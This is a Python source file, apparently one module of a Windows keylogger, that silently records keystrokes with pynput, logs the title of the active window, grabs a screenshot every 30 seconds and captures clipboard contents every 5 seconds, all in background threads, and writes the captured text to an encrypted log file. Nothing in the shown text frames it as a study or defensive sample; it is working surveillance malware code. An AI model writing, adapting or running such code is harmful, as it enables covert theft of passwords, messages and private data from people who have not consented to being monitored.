from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab
import pyperclip
import threading
import time
import win32gui

from utils import get_log_file, get_timestamp
from crypto_utils import encrypt_data

LOG_FILE = get_log_file()
logging_enabled = False
current_window = ""


def write_log(text):
    encrypted = encrypt_data(text)
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted + b"\n")


def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown"


def on_press(key):
    global current_window

    if not logging_enabled:
        return

    window = get_active_window()

    if window != current_window:
        current_window = window
        write_log(f"\n{get_timestamp()} [WINDOW] {window}\n")

    key_str = str(key).replace("'", "")

    if "Key.space" in key_str:
        write_log(" ")
    elif "Key.enter" in key_str:
        write_log("\n")
    elif "Key.backspace" in key_str:
        write_log("[BACKSPACE]")
    else:
        write_log(key_str)


def screenshot_worker():
    while True:
        if logging_enabled:
            img = ImageGrab.grab()
            filename = f"logs/screenshot_{datetime.now().strftime('%H-%M-%S')}.png"
            img.save(filename)
        time.sleep(30)


def clipboard_worker():
    last = ""
    while True:
        if logging_enabled:
            data = pyperclip.paste()
            if data != last:
                write_log(f"\n{get_timestamp()} [CLIPBOARD] {data}\n")
                last = data
        time.sleep(5)


def start_background():
    threading.Thread(target=screenshot_worker, daemon=True).start()
    threading.Thread(target=clipboard_worker, daemon=True).start()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()